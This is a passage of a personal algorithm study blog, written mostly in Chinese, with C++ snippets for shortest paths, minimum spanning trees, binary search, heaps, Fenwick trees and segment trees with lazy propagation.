&#123;<br><span class="hljs-type">int</span> v=adj[u][x];<br><span class="hljs-keyword">if</span>(!vist[v]) &#123;<br><span class="hljs-keyword">if</span>(d[u]+score[u][v]&lt;d[v]) &#123;<br>d[v]=d[u]+score[u][v];<br>w[v]=w[u]+vou[u][v];<br>pre[v]=u;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// dijstra 聚点 + 邻接表 N + 1个顶点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;++i)&#123;<br>    <span class="hljs-keyword">if</span>(inDegree[i]==<span class="hljs-number">0</span>)&#123;<br>        Adj[N].<span class="hljs-built_in">push_back</span>(i);<br>        zeroDegree.<span class="hljs-built_in">insert</span>(i);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 找到相同</span><br><span class="hljs-comment">// INT_MAX溢出</span><br><span class="hljs-keyword">if</span> (dist[node] != dist[tmp[i]])<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// floyd</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= n; k ++ )&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= n; i ++ )&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= n; j ++ )&#123;<br><span class="hljs-keyword">if</span>(g[i][k]!=inf&amp;&amp;g[k][j]!=inf)<br>g[i][j] = <span class="hljs-built_in">min</span>(g[i][k]+g[k][j],g[i][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// dfs 回溯路径 -&gt; 多目标</span><br><span class="hljs-comment">// pair&lt;int, int&gt; 历史的最大的需要带的累积</span><br><span class="hljs-built_in">rep</span> (i, <span class="hljs-number">0</span>, n) &#123;<br>    <span class="hljs-keyword">if</span> (!vis[i] &amp;&amp; w[id][i] != INF) &#123;<br>        <span class="hljs-keyword">if</span> (w[id][i] + dis[id] &lt; dis[i]) &#123;<br>            dis[i] = w[id][i] + dis[id];<br>            fa[i].<span class="hljs-built_in">clear</span>();<br>            cv[i].<span class="hljs-built_in">clear</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;vv:cv[id]) &#123;<br>                fa[i].<span class="hljs-built_in">pub</span>(id);<br>                cv[i].<span class="hljs-built_in">pub</span>(vv + c / <span class="hljs-number">2</span> - cc[i]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (w[id][i] + dis[id] == dis[i]) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;vv:cv[id]) &#123;<br>                fa[i].<span class="hljs-built_in">pub</span>(id);<br>                cv[i].<span class="hljs-built_in">pub</span>(vv + c / <span class="hljs-number">2</span> - cc[i]);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> v)</span> </span>&#123;<br>    temppath.<span class="hljs-built_in">push_back</span>(v);<br>    <span class="hljs-keyword">if</span>(v == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">int</span> need = <span class="hljs-number">0</span>, back = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = temppath.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-type">int</span> id = temppath[i];<br>            <span class="hljs-keyword">if</span>(weight[id] &gt; <span class="hljs-number">0</span>) &#123;<br>                back += weight[id];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span>(back &gt; (<span class="hljs-number">0</span> - weight[id])) &#123;<br>                    back += weight[id];<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    need += ((<span class="hljs-number">0</span> - weight[id]) - back);<br>                    back = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(need &lt; minNeed) &#123;<br>            minNeed = need;<br>            minBack = back;<br>            path = temppath;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(need == minNeed &amp;&amp; back &lt; minBack) &#123;<br>            minBack = back;<br>            path = temppath;<br>        &#125;<br>        temppath.<span class="hljs-built_in">pop_back</span>();<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; pre[v].<span class="hljs-built_in">size</span>(); i++)<br>        <span class="hljs-built_in">dfs</span>(pre[v][i]);<br>    temppath.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br><span class="hljs-comment">// 0 - 1 bfs</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">sz</span>(q)) &#123;<br>    <span class="hljs-type">int</span> tt = q.<span class="hljs-built_in">front</span>();<br>    q.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-keyword">if</span> (tt == b) <span class="hljs-keyword">break</span>;<br>    vis[tt] = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">rep</span> (i, <span class="hljs-number">0</span>, <span class="hljs-built_in">sz</span>(g[tt])) &#123;<br>        <span class="hljs-type">int</span> line = id[tt][i];<br>        <span class="hljs-type">int</span> tar = g[tt][i];<br>        <span class="hljs-function">node <span class="hljs-title">nn</span><span class="hljs-params">(line, tt)</span></span>;<br>        <span class="hljs-type">int</span> sign = <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">rep</span> (i, <span class="hljs-number">0</span>, <span class="hljs-built_in">sz</span>(par[tt])) &#123;<br>            <span class="hljs-keyword">if</span> (line == par[tt][i].line) &#123;<br>                sign = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dis[tar] &gt; dis[tt] + <span class="hljs-number">1</span>) &#123;<br>            par[tar].<span class="hljs-built_in">clear</span>();<br>            dis[tar] = dis[tt] + <span class="hljs-number">1</span>;<br>            par[tar].<span class="hljs-built_in">pub</span>(nn);<br>            ex[tar] = ex[tt] + sign;<br>            q.<span class="hljs-built_in">push</span>(tar);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dis[tar] == dis[tt] + <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-type">int</span> ww = ex[tt] + sign;<br>            <span class="hljs-keyword">if</span> (ww == ex[tar]) &#123;<br>                par[tar].<span class="hljs-built_in">pub</span>(nn);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ww &lt; ex[tar]) &#123;<br>                par[tar].<span class="hljs-built_in">clear</span>();<br>                par[tar].<span class="hljs-built_in">pub</span>(nn);<br>                ex[tar] = ww;<br>            &#125;<br>            q.<span class="hljs-built_in">push</span>(tar);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// A*</span><br><br></code></pre></td></tr></table></figure><h3 id="mst强连通">MST/强连通</h3><p>minimum weight spanning tree 使得权值最短的路</p><ol type="1"><li><p>Kruskal</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 从最小边开始加入</span><br><span class="hljs-comment">// 并查集判断是否有环</span><br><span class="hljs-comment">// 无环则加入</span><br><br><span class="hljs-built_in">sort</span>(edgelist.<span class="hljs-built_in">begin</span>(), edgelist.<span class="hljs-built_in">end</span>());<br><br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> edge : edgelist) &#123;<br>    <span class="hljs-type">int</span> w = edge[<span class="hljs-number">0</span>], x = edge[<span class="hljs-number">1</span>], y = edge[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">// take that edge in MST if it does form a cycle</span><br>    <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">find</span>(x) != s.<span class="hljs-built_in">find</span>(y)) &#123;<br>        s.<span class="hljs-built_in">unite</span>(x, y);<br>        ans += w;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>强连通分量 tarjan</p></li></ol><h3 id="网络流问题">网络流问题</h3><p>源点：有n个点，有m条有向边，其中有一个点比较特殊，它只出不进，即入度为0。这样的点我们称为源点，一般用字母S表示。汇点：另一个点也比较特殊，只进不出，即出度为0。这样的点我们称为汇点，一般用字母T表示。容量和流量：每条有向边上有两个量，容量和流量，从i到j的容量表示为c[i,j]表示，流量则用f[i,j]表示。</p><p>模板1 最小费用最大流问题 在最大流的基础上(全选...) 使得费用最小 模板2二分图权值匹配 - 一一对应</p><h2 id="二分">二分</h2><ol type="1"><li>核心是判断f(x)的二元性（一部分相同 一部分不同）以及最快的求法</li><li>注意边界的讨论，差值类问题a[l]和a[l - 1]同时考虑即可</li><li>! 广义的规律</li></ol><p>ls-37</p><p><img src="/images/binary-1.png" alt="image-20220414201412729" style="zoom:50%;" /></p><p>直线满足顺序</p><h3 id="二元性">二元性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 计数</span><br><br><span class="hljs-comment">// 记录小于等于x的数值个数s</span><br><span class="hljs-keyword">auto</span> pos = <span class="hljs-built_in">ub</span>(<span class="hljs-built_in">all</span>(v), x) - v.<span class="hljs-built_in">begin</span>();<br><span class="hljs-comment">// 记录大于x的数值个数</span><br><span class="hljs-built_in">sz</span>(v) - pos;<br><span class="hljs-comment">// 记录小于x的数值个数 大于等于同理,指针指向第一个不小于x的位置</span><br><span class="hljs-keyword">auto</span> pos = <span class="hljs-built_in">lb</span>(<span class="hljs-built_in">all</span>(v), x) - v.<span class="hljs-built_in">begin</span>();<br><br><span class="hljs-comment">// 插入使得数组递增 - 在第一个不大于x的位置上插入 - 本来的意义</span><br>arr.<span class="hljs-built_in">insert</span>(pos, v); <br></code></pre></td></tr></table></figure><p>存在二元的规律即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 二分 注意边界的处理，若不存在想要找的值得情况。</span><br><span class="hljs-keyword">while</span>(left &lt; right) &#123;<br>    <span class="hljs-comment">// 是否加一取决于是否收敛</span><br>    <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-comment">// 不需要的结果</span><br>    <span class="hljs-keyword">if</span> (nn[mid] &lt; diff) &#123;<br>        left = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        right = mid;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// lower bound first element not less than i; </span><br><span class="hljs-comment">// upper bound first element greater than i; greater&lt;int&gt; 则相反</span><br><span class="hljs-keyword">auto</span> lower = <span class="hljs-built_in">lower_bound</span>(data.<span class="hljs-built_in">begin</span>(), data.<span class="hljs-built_in">end</span>(), i);<br><span class="hljs-keyword">if</span> (lower != data.<span class="hljs-built_in">end</span>()) <span class="hljs-type">int</span> pos = lower - data.<span class="hljs-built_in">begin</span>();<br></code></pre></td></tr></table></figure><h2 id="贪心">贪心</h2><p>!注意多状态的特性<br />只考虑了存在一种可能AC由于AB，但没有考虑到BC的整体情况总出现在相同的两列 - 点集中斜率的最大值</p><p><img src="/images/greedy01.png" alt="image-20220414201526887" style="zoom:50%;" /></p><p>只需要考虑 a+=lowbit(a)</p><p>局部贪心 diff 只有在遇到B是更新</p><h2 id="树">树</h2><h3 id="堆">堆</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">(<span class="hljs-type">int</span> size, <span class="hljs-type">int</span> i)</span></span>&#123;<br><span class="hljs-comment">// 最后一个非叶子节点的位置 2x -&gt; 左节点 2x+1 -&gt; 右节点</span><br><span class="hljs-type">int</span> l = <span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>; <br>    <span class="hljs-type">int</span> r = <span class="hljs-number">2</span> * i + <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> largest = i;<br>    <span class="hljs-keyword">if</span> (l &lt; size &amp;&amp; hT[l] &gt; hT[largest])<br>largest = l;<br><span class="hljs-keyword">if</span> (r &lt; size &amp;&amp; hT[r] &gt; hT[largest])<br>largest = r;<br><span class="hljs-keyword">if</span> (largest != i) &#123;<br>        <span class="hljs-comment">// 自顶而下调整</span><br>        <span class="hljs-built_in">swap</span>(&amp;hT[i], &amp;hT[largest]);<br><span class="hljs-built_in">heapify</span>(size, largest);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// heap sort 堆顶替换，重建堆</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heapSort</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 建堆（从最后一个非叶子节点向上）</span><br>    <span class="hljs-comment">// size 2n + 2 / 2n + 3</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = size / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">heapify</span>(size, i);<br>    &#125;<br>    <span class="hljs-comment">// 堆排序</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = size - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>        <span class="hljs-comment">// 将当前最大的放置到数组末尾</span><br>        <span class="hljs-built_in">swap</span>(arr[<span class="hljs-number">0</span>], arr[i]);<br>        <span class="hljs-comment">// 将未完成排序的部分继续进行堆排序</span><br>        <span class="hljs-built_in">heapify</span>(i, <span class="hljs-number">0</span>);             <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="multiset">multiset</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// multiset 使用 prev()</span><br><span class="hljs-keyword">auto</span> check = [&amp;](<span class="hljs-type">int</span> mid) -&gt; <span class="hljs-type">bool</span> &#123;<br>    <span class="hljs-type">int</span> p = pills;<br>    <span class="hljs-comment">// 工人的有序集合</span><br>    multiset&lt;<span class="hljs-type">int</span>&gt; ws;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = m - mid; i &lt; m; ++i) &#123;<br>        ws.<span class="hljs-built_in">insert</span>(workers[i]);<br>    &#125;<br>    <span class="hljs-comment">// 从大到小枚举每一个任务</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = mid - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>        <span class="hljs-comment">// 如果有序集合中最大的元素大于等于 tasks[i]</span><br>        <span class="hljs-comment">// rbegin() 不行</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> it = <span class="hljs-built_in">prev</span>(ws.<span class="hljs-built_in">end</span>()); *it &gt;= tasks[i]) &#123;<br>            ws.<span class="hljs-built_in">erase</span>(it);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!p) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">auto</span> rep = ws.<span class="hljs-built_in">lower_bound</span>(tasks[i] - strength);<br>            <span class="hljs-keyword">if</span> (rep == ws.<span class="hljs-built_in">end</span>()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            --p;<br>            ws.<span class="hljs-built_in">erase</span>(rep);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="二叉树">二叉树</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 注意树的建图过程 子节点为0 需要排除父节点</span><br><span class="hljs-comment">// 相似的模式</span><br><span class="hljs-comment">// 基于一个二叉搜索树即推导 -&gt; 难以证明</span><br><br><span class="hljs-comment">// AVL 左左 右右 左右 = 右右 + 左左</span><br><span class="hljs-comment">// 红黑树 Is It A Red-Black Tree？</span><br><br><span class="hljs-comment">// 有可能没有节点</span><br><span class="hljs-comment">// ！！！注意根节点的特殊情况</span><br><span class="hljs-keyword">if</span> (cur != <span class="hljs-number">1</span> &amp;&amp; graph[cur].<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>) &#123;<br>    isleave = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">1</span> &amp;&amp; graph[cur].<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) isleave = <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure><h3 id="bit树">bit树</h3><p>树状数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// c数组为[1, maxn]</span><br><br>vector&lt;<span class="hljs-type">int</span>&gt; c;<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> x &amp; (-x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> maxn, <span class="hljs-type">int</span> v)</span> </span>&#123;<br>    <span class="hljs-comment">// x += 1 若nums从0开始</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = x; i &lt;= maxn; i += <span class="hljs-built_in">lowbit</span>(i))<br>        c[i] += v;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = x; i &gt;= <span class="hljs-number">1</span>; i -= <span class="hljs-built_in">lowbit</span>(i))<br>        sum += c[i];<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRange</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>    <span class="hljs-comment">// 从i到j</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getsum</span>(j) - <span class="hljs-built_in">getsum</span>(i - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// 示例</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">5</span>;<br>    c.<span class="hljs-built_in">assign</span>(n + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">update</span>(i, n, <span class="hljs-number">1</span>);<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-built_in">sumRange</span>(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>线段树</p><p>l-307 range sum query<br /><a href="https://zhuanlan.zhihu.com/p/92920381">solutions</a><br />sqrt(n) blocks(known length)<br />binary indexed tree(Fenwick tree) 对操作数进行累加 (前面所有的操作数)而非数值本身</p><figure><img src="/images/bit-1.png" alt="image-20220307143054073" /><figcaption aria-hidden="true">image-20220307143054073</figcaption></figure><p>l-1622 fancy-sequence<br />inverse order - add all multall opt - ax + b<br />combine opt 使用数组快于vector</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> += (<span class="hljs-type">const</span> node &amp;t)&#123;<br>    a = a * t.a%mod;<br>    b = (b * t.a + t.b)%mod;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*  </span><br><span class="hljs-comment">10分钟以内，顺利可敲完</span><br><span class="hljs-comment">线段树 完全二分树 占用空间大小2n - 4n</span><br><span class="hljs-comment">将问题拆分成二分的区间，通过push_up在回溯结束后维护各个区间的值。</span><br><span class="hljs-comment">如果要区间更新，需要在查询的过程中，通过push_down传递lazy_tag，同时还原对应节点的真实值。</span><br><span class="hljs-comment">区间赋值的tag就是值本身，区间加减则通过加减。</span><br><span class="hljs-comment">lv, rv代表维护的区间，l、v代表查询/更新的区间。一般用[lv, mid], [mid + 1, rv]代表左右节点</span><br><span class="hljs-comment">l、v值在于限定节点，而节点更新只与lv，rv，lz有关，与l、v无关。</span><br><span class="hljs-comment">时间复杂度证明可以考虑只有两侧的节点需要不断的递归，中间的树的分支都不需要再次更新。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">8e5</span>;<br><span class="hljs-type">int</span> cnt = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-comment">// 考虑到赋值</span><br>    ll v = <span class="hljs-number">0</span>, l, r, lz = <span class="hljs-number">0</span>, is_c = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// max/min，初始值只能为0，max，min可能被未初始化的值</span><br>    <span class="hljs-comment">// 因为有push_down，不用担心在push_up时虚拟节点的值影响min</span><br>    ll vv = <span class="hljs-number">0</span>, llz = <span class="hljs-number">0</span>;<br>&#125;tree[<span class="hljs-number">4</span> * maxn];<br><br><span class="hljs-comment">// tree[0].l = 1, tree[0].r = 2</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">create</span><span class="hljs-params">(ll cur)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!tree[cur].is_c) &#123;<br>        tree[cur].l = cnt++;<br>        tree[cur].r = cnt++;<br>        tree[cur].is_c = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 依次更新上层节点的值</span><br><span class="hljs-comment">// 可以改写成区间最值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push_up</span><span class="hljs-params">(ll cur)</span> </span>&#123;<br>    <span class="hljs-type">int</span> lnode = tree[cur].l, rnode = tree[cur].r;<br>    <span class="hljs-comment">// 未更新的节点可以不更新 针对max与min</span><br>    tree[cur].v = tree[lnode].v + tree[rnode].v;<br>&#125;<br><br><span class="hljs-comment">// 懒更新 </span><br><span class="hljs-comment">// 有区间赋值，区间加减两种。 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push_down</span><span class="hljs-params">(ll cur, ll lv, ll rv)</span> </span>&#123;<br>    <span class="hljs-comment">// 还原区间</span><br>    <span class="hljs-type">int</span> mid = (lv + rv) / <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> lnode = tree[cur].l, rnode = tree[cur].r;<br>    <span class="hljs-comment">// 注意这里还未创建的节点也需要更新</span><br>    tree[lnode].lz += tree[cur].lz;<br>    